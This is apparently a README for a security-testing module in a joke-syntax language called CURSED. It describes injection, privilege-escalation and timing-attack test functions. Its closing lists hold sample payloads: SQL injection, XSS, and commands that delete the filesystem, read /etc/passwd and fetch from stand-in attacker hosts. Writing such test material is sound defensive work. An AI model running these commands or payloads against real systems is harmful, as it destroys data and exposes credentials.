# Security Testing Framework

Comprehensive security testing primitives for CURSED applications.

## Overview

This module provides a complete security testing framework with support for:
- Multi-vector security testing
- Injection attack detection (SQL, Script, Command)
- Privilege escalation testing
- Timing attack resistance verification
- Security validation utilities

## Core Functions

### `security_test(function_name, attack_vectors)`
Tests a function against multiple attack vectors to identify potential security vulnerabilities.

**Parameters:**
- `function_name` (tea): Name of the function to test
- `attack_vectors` ([tea]): Array of attack payloads to test

**Returns:** (lit) `based` if secure, `cap` if vulnerabilities detected

### `injection_test(input_function, payloads)`
Comprehensive injection attack testing including SQL, script, and command injection.

**Parameters:**
- `input_function` (tea): Name of the input handling function
- `payloads` ([tea]): Array of injection payloads

**Returns:** (lit) `based` if all injections blocked, `cap` if vulnerabilities found

### `privilege_escalation_test(function_name)`
Tests for privilege escalation vulnerabilities including unauthorized access and boundary violations.

**Parameters:**
- `function_name` (tea): Name of the function to test

**Returns:** (lit) `based` if secure, `cap` if escalation possible

### `timing_attack_test(function_name)`
Tests resistance to timing attacks by analyzing execution time variance.

**Parameters:**
- `function_name` (tea): Name of the function to test

**Returns:** (lit) `based` if timing-resistant, `cap` if vulnerable

## Security Detection Utilities

### `contains_sql_injection(input)`
Detects SQL injection patterns in input strings.

### `contains_script_injection(input)`
Detects script injection patterns for XSS prevention.

### `contains_command_injection(input)`
Detects command injection patterns in system inputs.

### `is_safe_input(input)`
General input safety validation combining multiple security checks.

## Usage Examples

```cursed
yeet "security_testing"

# Basic security test
sus attack_vectors [tea] = ["' OR '1'='1", "<script>alert('xss')</script>"]
sus result lit = security_test("user_login", attack_vectors)

# SQL injection testing
sus sql_payloads [tea] = ["'; DROP TABLE users", "admin'--"]
sus sql_safe lit = injection_test("database_query", sql_payloads)

# Privilege escalation testing
sus privilege_safe lit = privilege_escalation_test("admin_panel")

# Timing attack testing
sus timing_safe lit = timing_attack_test("password_verify")
```

## Integration with testz

This framework integrates seamlessly with the testz testing framework:

```cursed
yeet "testz"
yeet "security_testing"

test_start("Application Security Tests")

# Test your application's security
sus secure lit = security_test("user_input_handler", attack_vectors)
assert_true(secure)

print_test_summary()
```

## Security Best Practices

1. **Input Validation**: Always validate and sanitize user inputs
2. **Parameterized Queries**: Use parameterized queries to prevent SQL injection
3. **Output Encoding**: Encode outputs to prevent XSS attacks
4. **Privilege Separation**: Implement proper access controls and privilege boundaries
5. **Timing Consistency**: Ensure consistent timing for authentication operations
6. **Regular Testing**: Run security tests as part of your CI/CD pipeline

## Attack Vector Examples

### SQL Injection
- `"' OR '1'='1"`
- `"'; DROP TABLE users; --"`
- `"admin'--"`
- `"' UNION SELECT password FROM users --"`

### Script Injection (XSS)
- `"<script>alert('xss')</script>"`
- `"javascript:alert('xss')"`
- `"<img src=x onerror=alert('xss')>"`
- `"eval('malicious_code()')"`

### Command Injection
- `"; rm -rf /"`
- `"| cat /etc/passwd"`
- `"&& wget malicious.com/payload"`
- `"`curl attacker.com`"`

## Testing

Run the comprehensive test suite:

```bash
cargo run --bin cursed stdlib/security_testing/test_security_testing.csd
```

## Implementation Notes

This framework is implemented in pure CURSED without external dependencies, ensuring:
- Maximum portability across platforms
- Integration with CURSED's type system
- Consistent behavior in both interpretation and compilation modes
- No FFI dependencies for enhanced security

## Future Enhancements

- CSRF protection testing
- Session management security
- Cryptographic implementation testing
- Rate limiting validation
- File upload security testing
- Authentication bypass testing
